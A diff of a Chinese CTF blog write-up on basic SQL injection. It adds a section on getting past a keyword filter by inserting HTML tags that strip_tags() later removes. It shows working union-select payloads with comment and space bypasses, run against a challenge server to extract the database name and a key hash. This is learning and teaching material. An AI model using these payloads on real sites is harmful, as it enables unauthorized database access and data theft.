@@ -96,14 +96,16 @@
 <meta name="description" content="正在学习sql注入 差不多完整理解了一些注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
 <meta name="keywords" content="sql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="几道基础sql注入">
-<meta property="og:url" content="http://Merl1ng.com/2017/08/02/几道基础sql注入/index.html">
+<meta property="og:title" content="若干sql注入">
+<meta property="og:url" content="http://Merl1ng.com/2017/08/02/若干sql注入/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="正在学习sql注入 差不多完整理解了一些注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
-<meta property="og:updated_time" content="2017-09-16T04:08:21.686Z">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqlxss1.PNG">
+<meta property="og:updated_time" content="2017-10-06T08:02:41.776Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="几道基础sql注入">
+<meta name="twitter:title" content="若干sql注入">
 <meta name="twitter:description" content="正在学习sql注入 差不多完整理解了一些注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
+<meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/sqlxss1.PNG">
 
 
 
@@ -131,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/08/02/几道基础sql注入/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2017/08/02/若干sql注入/"/>
 
 
 
 
 
-  <title>几道基础sql注入 | Merl1ng's blog</title>
+  <title>若干sql注入 | Merl1ng's blog</title>
   
 
 
@@ -266,7 +268,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/08/02/几道基础sql注入/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/08/02/若干sql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Merl1ng">
@@ -283,7 +285,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">几道基础sql注入</h1>
+          <h1 class="post-title" itemprop="name headline">若干sql注入</h1>
         
 
         <div class="post-meta">
@@ -366,9 +368,24 @@
 <p>最终的查询语句为<br><code>&#39;unionunion  selectselect  flag fromfrom  flag wherewhere &#39;&#39;=&#39;</code><br>或者<br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code></p>
 <p>后记</p>
 <p>这个题还有比较奇怪的一点是不能用注释 注释掉后面的 ‘<br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--</code><br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--+</code><br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag#</code><br>都不行 可能也进行了过滤</p>
-<h3 id="Sql-2"><a href="#Sql-2" class="headerlink" title="Sql 2"></a>Sql 2</h3><p>这题过滤了空格..</p>
+<h3 id="Sql-2-空格过滤"><a href="#Sql-2-空格过滤" class="headerlink" title="Sql 2 空格过滤"></a>Sql 2 空格过滤</h3><p>这题过滤了空格..</p>
 <p>可以用/**/代替空格 </p>
 <p><code>?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p>
+<h3 id="Sql-3-xss过滤"><a href="#Sql-3-xss过滤" class="headerlink" title="Sql 3 xss过滤"></a>Sql 3 xss过滤</h3><p>题目<br><img src="http://otvzfr1o1.bkt.clouddn.com/sqlxss1.PNG" alt=""></p>
+<p>由题目源码可知 存在sql关键词过滤，存在xss过滤</p>
+<p>可以知道strip_tags（）函数会过剥去字符串中的 HTML 标签</p>
+<p>所以在sql关键词中插入HTML标签绕过sql过滤，然后通过xss过滤删去HTML标签</p>
+<p><a href="http://103.238.227.13:10087/?id=1" target="_blank" rel="external">http://103.238.227.13:10087/?id=1</a> o&lt;&gt;rder by 1%23</p>
+<p><a href="http://103.238.227.13:10087/?id=1" target="_blank" rel="external">http://103.238.227.13:10087/?id=1</a> o&lt;&gt;rder by 2%23</p>
+<p><a href="http://103.238.227.13:10087/?id=1" target="_blank" rel="external">http://103.238.227.13:10087/?id=1</a> o&lt;&gt;rder by 3%23</p>
+<p>发现表只有两列</p>
+<p>这步也可以这样<br><a href="http://103.238.227.13:10087/?id=1" target="_blank" rel="external">http://103.238.227.13:10087/?id=1</a> un&lt;&gt;ion se&lt;&gt;lect 1,2%23</p>
+<p><a href="http://103.238.227.13:10087/?id=1" target="_blank" rel="external">http://103.238.227.13:10087/?id=1</a> un&lt;&gt;ion se&lt;&gt;lect database(),2%23<br>拿到数据库名 sql3</p>
+<p><a href="http://103.238.227.13:10087/index.php?id=1" target="_blank" rel="external">http://103.238.227.13:10087/index.php?id=1</a> un&lt;&gt;ion se&lt;&gt;lect hash,1 fro&lt;&gt;m sql3.key%23</p>
+<p>或者 <code>key</code><br><a href="http://103.238.227.13:10087/index.php?id=1" target="_blank" rel="external">http://103.238.227.13:10087/index.php?id=1</a> un&lt;&gt;ion se&lt;&gt;lect hash,1 fro&lt;&gt;m <code>key</code>%23</p>
+<p>`` 解释 假设第一个from是字段名，最后的table也是字段名，但是同时也是mysql关键字，这样执行的时候就会报错，所以应该使用</p>
+<p>select <code>from</code> from <code>table</code></p>
+<p>还有把&lt;&gt;改成%00也能绕过</p>
 
       
     </div>
@@ -573,7 +590,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql-1"><span class="nav-number">1.</span> <span class="nav-text">Sql 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql-2"><span class="nav-number">2.</span> <span class="nav-text">Sql 2</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql-1"><span class="nav-number">1.</span> <span class="nav-text">Sql 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql-2-空格过滤"><span class="nav-number">2.</span> <span class="nav-text">Sql 2 空格过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql-3-xss过滤"><span class="nav-number">3.</span> <span class="nav-text">Sql 3 xss过滤</span></a></li></ol></div>
             
 
           </div>
